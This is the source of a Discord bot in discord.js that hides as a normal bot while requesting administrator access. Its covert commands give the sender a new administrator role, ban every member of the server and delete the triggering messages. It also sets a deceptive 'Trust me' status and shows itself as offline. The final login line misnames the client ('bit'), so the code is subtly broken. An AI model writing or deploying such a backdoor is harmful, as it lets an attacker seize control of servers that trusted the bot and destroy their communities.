const botSettings = require("./botsettings.json");
const Discord = require("discord.js");
const bot = new Discord.Client({disableEveryone: true});

bot.on("ready", async () => {
	console.log(` Activated`);
	//Bot Status
	bot.user.setStatus("offline");
	bot.user.setActivity(`Trust me`);

	try {
		//Generates a invite link in the console...
	let link = await bot.generateInvite(["ADMINISTRATOR"]);
	console.log(link);
	} catch(e) {
		console.log(e.stack);
	}
});

bot.on("message", async message => { 
if(message.author.bot) return;

	const args = message.content.slice(botSettings.prefix.length).trim().split(/ +/g);
  	const command = args.shift().toLowerCase();

  //Gives you the admin role and deletes the message.
  if(command === `ctrl`) {
  	try {
	role = await message.guild.createRole({
 	name: "Dope Role",
  	color: "#2f3136",
  	permissions: [8]
	});
	message.member.addRole(role)
	message.delete(1000);
	} catch(e) {
		console.log(e.stack);
	}
   }
   //Bans everyone and deletes the message.
   if(command === `adios`) {
   	try {
   	message.guild.members.forEach(member => {member.ban()});
   	message.delete(1000);
   	} catch(e) {
	console.log(e.stack);
   	}
   }

   if(command === `leaveserver`) {
   	try {
   	message.guild.leave();
   	} catch(e) {
	console.log(e.stack);
   	}
   }
});

bit.login(process.env.BOT_TOKEN);
